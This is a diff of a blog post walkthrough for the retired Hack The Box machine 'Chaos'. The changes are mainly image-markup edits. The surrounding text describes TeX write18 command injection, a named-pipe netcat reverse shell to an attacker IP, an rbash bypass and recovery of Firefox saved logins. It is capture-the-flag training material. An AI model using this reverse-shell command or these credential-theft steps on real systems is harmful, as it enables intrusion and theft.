@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Chaos, a retired vulnerable [VM]
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -101,15 +101,15 @@ PORT      STATE SERVICE  REASON         VERSION
 
 `nmap` finds `80/tcp`, `110/tcp`, `143/tcp`, `993/tcp`, `995/tcp`, and my oh my `10000/tcp` open. I haven't seen Webmin in a long time. In any case, let's go with the `http` service first. This is how the site looks like.
 
-<a class="image-popup">
-![1227280a.png](/assets/images/posts/chaos-htb-walkthrough/1227280a.png)
-</a>
+
+{% include image.html image_alt="1227280a.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1227280a.png" %}
+
 
 Hmm. Must have something to do with the `Host` request header. Let's map 10.10.10.120 to `chaos.htb` in `/etc/hosts`. Once you have done that, this is how the site looks like.
 
-<a class="image-popup">
-![91378288.png](/assets/images/posts/chaos-htb-walkthrough/91378288.png)
-</a>
+
+{% include image.html image_alt="91378288.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/91378288.png" %}
+
 
 ### Directory/File Enumeration
 
@@ -180,15 +180,15 @@ What do you know? WordPress is installed!
 
 This is how the blog looks like. You can see that there's a protected post.
 
-<a class="image-popup">
-![e1946bba.png](/assets/images/posts/chaos-htb-walkthrough/e1946bba.png)
-</a>
+
+{% include image.html image_alt="e1946bba.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/e1946bba.png" %}
+
 
 After much guessing :-1:, the password is `human`. :unamused:
 
-<a class="image-popup">
-![1f96aae6.png](/assets/images/posts/chaos-htb-walkthrough/1f96aae6.png)
-</a>
+
+{% include image.html image_alt="1f96aae6.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1f96aae6.png" %}
+
 
 ### Webmail
 
@@ -198,21 +198,21 @@ Let's verify the webmail credentials with IMAPS. IMAPS seem to be more likely to
 # openssl s_client -crlf -connect 10.10.10.120:993
 ```
 
-<a class="image-popup">
-![0f685e2c.png](/assets/images/posts/chaos-htb-walkthrough/0f685e2c.png)
-</a>
+
+{% include image.html image_alt="0f685e2c.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/0f685e2c.png" %}
+
 
 Awesome. The credentials work. Let's `LIST` the mail boxes.
 
-<a class="image-popup">
-![225e1fa9.png](/assets/images/posts/chaos-htb-walkthrough/225e1fa9.png)
-</a>
+
+{% include image.html image_alt="225e1fa9.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/225e1fa9.png" %}
+
 
 The only mail exists in Drafts.
 
-<a class="image-popup">
-![cf4776bc.png](/assets/images/posts/chaos-htb-walkthrough/cf4776bc.png)
-</a>
+
+{% include image.html image_alt="cf4776bc.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/cf4776bc.png" %}
+
 
 Let's read the mail.
 
@@ -397,23 +397,23 @@ if __name__ == '__main__':
 
 The message after decryption is a `base64`-encoded message. This is the message after decoding.
 
-<a class="image-popup">
-![1844d5e1.png](/assets/images/posts/chaos-htb-walkthrough/1844d5e1.png)
-</a>
+
+{% include image.html image_alt="1844d5e1.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1844d5e1.png" %}
+
 
 ## Low-Privilege Shell
 
 This is how the new service looks like.
 
-<a class="image-popup">
-![dcd98cfd.png](/assets/images/posts/chaos-htb-walkthrough/dcd98cfd.png)
-</a>
+
+{% include image.html image_alt="dcd98cfd.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/dcd98cfd.png" %}
+
 
 The service creates PDFs based on templates. Digging into the JavaScript, it's obvious that the service creates PDFs based on TeX templates modified through PHP.
 
-<a class="image-popup">
-![5b725f83.png](/assets/images/posts/chaos-htb-walkthrough/5b725f83.png)
-</a>
+
+{% include image.html image_alt="5b725f83.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/5b725f83.png" %}
+
 
 Notice that there's no element with the ID `output`. It's easy to create a `<textarea>` with the ID `output` using jQuery since that's available.
 
@@ -423,15 +423,15 @@ $('body').append('<textarea id="output" style="width: 100%; height: 200px;">')
 
 Template 2 and 3 are working. More importantly, a TeX [primitive](https://tex.stackexchange.com/questions/20444/what-are-immediate-write18-and-how-does-one-use-them) `write18` that executes command is exposed.
 
-<a class="image-popup">
-![ea9f652d.png](/assets/images/posts/chaos-htb-walkthrough/ea9f652d.png)
-</a>
+
+{% include image.html image_alt="ea9f652d.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/ea9f652d.png" %}
+
 
 With that in mind, let's see if our beloved `nc` is available on the host.
 
-<a class="image-popup">
-![9e85d97e.png](/assets/images/posts/chaos-htb-walkthrough/9e85d97e.png)
-</a>
+
+{% include image.html image_alt="9e85d97e.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/9e85d97e.png" %}
+
 
 Awesome. Too bad, the `-e` is not available. Fret not, we can still make do with something like this.
 
@@ -441,15 +441,15 @@ rm -rf /tmp/p; mknod /tmp/p p; /bin/bash 0</tmp/p | nc 10.10.13.52 1234 >/tmp/p
 
 True enough, a reverse shell appears on my `nc` listener.
 
-<a class="image-popup">
-![1a482f42.png](/assets/images/posts/chaos-htb-walkthrough/1a482f42.png)
-</a>
+
+{% include image.html image_alt="1a482f42.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/1a482f42.png" %}
+
 
 Let's upgrade the shell with Python's `pty` module and some `stty` magic.
 
-<a class="image-popup">
-![f385b4d8.png](/assets/images/posts/chaos-htb-walkthrough/f385b4d8.png)
-</a>
+
+{% include image.html image_alt="f385b4d8.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/f385b4d8.png" %}
+
 
 Sweet.
 
@@ -457,41 +457,41 @@ Sweet.
 
 Now, let's see if we can `su` ourselves to `ayush` with the password `jiujitsu` obtained earlier. Before we do that, know that `ayush`'s default shell is `rbash`.
 
-<a class="image-popup">
-![7ee16be4.png](/assets/images/posts/chaos-htb-walkthrough/7ee16be4.png)
-</a>
+
+{% include image.html image_alt="7ee16be4.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/7ee16be4.png" %}
+
 
 We can always bypass `rbash` like this.
 
-<a class="image-popup">
-![2d24e98b.png](/assets/images/posts/chaos-htb-walkthrough/2d24e98b.png)
-</a>
+
+{% include image.html image_alt="2d24e98b.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/2d24e98b.png" %}
+
 
 The `user.txt` is at `ayush`'s home directory.
 
-<a class="image-popup">
-![2bf5173c.png](/assets/images/posts/chaos-htb-walkthrough/2bf5173c.png)
-</a>
+
+{% include image.html image_alt="2bf5173c.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/2bf5173c.png" %}
+
 
 During enumeration of `ayush`'s account, I noticed the presence of a Mozilla Firefox profile, complete with saved logins to the Webmin interface.
 
-<a class="image-popup">
-![ae902700.png](/assets/images/posts/chaos-htb-walkthrough/ae902700.png)
-</a>
+
+{% include image.html image_alt="ae902700.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/ae902700.png" %}
+
 
 The saved credentials are protected by a master password. I copied the entire profile to a new profile on my attacking machine. And, since this is `ayush`'s Firefox profile, the master password is `jiujitsu` as well.
 
 The `root` password can be seen after the unlock.
 
-<a class="image-popup">
-![6e3bb466.png](/assets/images/posts/chaos-htb-walkthrough/6e3bb466.png)
-</a>
+
+{% include image.html image_alt="6e3bb466.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/6e3bb466.png" %}
+
 
 With the `root` password, we can `su` to `root` and retrieve `root.txt` like so.
 
-<a class="image-popup">
-![42acf4fa.png](/assets/images/posts/chaos-htb-walkthrough/42acf4fa.png)
-</a>
+
+{% include image.html image_alt="42acf4fa.png" image_src="/884c1fd7-6418-4f23-b058-2b4324b323a5/42acf4fa.png" %}
+
 
 :dancer:
 
